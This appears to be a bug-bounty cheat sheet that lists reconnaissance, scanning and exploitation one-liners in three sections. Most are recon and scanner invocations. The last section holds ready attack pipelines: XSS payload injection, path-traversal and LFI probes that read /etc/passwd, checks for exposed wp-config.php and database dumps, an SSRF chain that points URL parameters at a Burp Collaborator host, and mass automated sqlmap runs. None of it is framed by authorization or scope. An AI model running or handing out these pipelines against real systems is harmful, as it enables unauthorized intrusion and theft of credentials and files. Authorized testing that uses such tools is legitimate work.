Method 01:
subfinder -d example.com -o subdomains.txt

sublist3r -d example.com -o subdomains.txt

amass enum -d example.com -o subdomains.txt

dirsearch -u https://example.com -e *

nmap -sC -sV -oN nmap_results.txt example.com

nuclei -u https://example.com -o nuclei_results.txt

getjs --url https://example.com -o js_files.txt

gospider -s https://example.com -o spider_results/

gau example.com > all_urls.txt

waybackurls example.com > wayback_urls.txt

ffuf -u https://example.com/FUZZ -w wordlist.txt -o ffuf_results.json

dalfox url https://example.com -o xss_results.txt

sqlmap -u https://example.com/page.php?id=1 --batch --output-dir=sqlmap_output

xxeinjector -u https://example.com -o xxe_results.txt

ssrfmap -l urls.txt -o ssrf_results.txt

gitdumper.sh https://example.com/.git/ ./git_dump
trufflehog git+https://example.com/.git

racethewb -u https://example.com -o race_results.txt

python3 CORStest.py -u https://example.com > cors_results.txt

eyewitness --web -f urls.txt -d screenshots

parameth -u https://example.com > parameth_results.txt


Method 02:
# DNS Enumeration : dnsenum example.com

# WHOIS Lookup : whois example.com

# HTTP Fingerprinting : whatweb example.com

# Technology Stack Detection : wappalyzer example.com

# Nmap Scans
nmap -p 80,443 -T4 -A -Pn --max-parallelism 100 example.com
nmap -p- -T4 -Pn --max-parallelism 100 example.com

# Nikto Web Server Scan : nikto -h example.com

# Subdomain Enumeration : sublist3r -d example.com -o example.com-subdomains.txt

# Directory Enumeration : dirb http://example.com -r -o example.com-dirb.txt -t 10

# XSS Scan : xsser -u example.com

# SQL Injection Check : sqlmap -u example.com --batch

# Vulnerability Scanning with Nuclei : nuclei -l example.com-subdomains.txt -t vulnerabilities/ -o example.com-nuclei.txt

# Subdomain Enumeration with Amass : amass enum -d example.com -o example.com-amass.txt

Method 03:
🟨 XSS via Wayback URLs : echo https://target.com | waybackurls | grep "=" | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

🟧 Local File Inclusion : cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi.txt

🟩 WordPress mysql.sql Exposure : cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt

🟦 SSRF via Burp Collaborator : cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://hacker.burpcollaborator.net

🟥 SQLi (SQL Injection) Chain : httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'

🟪 LFI using gau + gf : cat subdomains.txt | httpx -silent -threads 500 | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

🟨 XSS Using airixss + wayback + qsreplace : echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"

🟩 Sensitive File Discovery with gau : cat subdomains.txt | gau | tee gau.txt | grep -Ei "\.xls|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.mp3|\.mp4|\.zip|\.tar|\.gzip|\.rar|\.json" | tee sensitive-files.txt

🟥 Wordlist Generation : cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u | tee wordlist.txt

🔵 /api/geojson LFI Detection : cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "/api/geojson?url=file:///etc/passwd" -mr "root:x" | anew geojson-lfi.txt

🟠 Nginx Path Traversal : cat subdomains.txt | httpx -silent -path "///////../../../../../../etc/passwd" -sc -mc 200 -mr "root:x" | anew nginx-traversal.txt

🔶 wp-config.php Backup Disclosure : cat subdomains.txt | httpx -silent -sc -mc 200 -path "/wp-config.php_org" -mr "DB_PASSWORD" | anew wp-config.php_orig

🟦 Create Wordlist from Live Responses : cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a wordlist.txt

🔺 Subdomain Takeover Detection : cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"



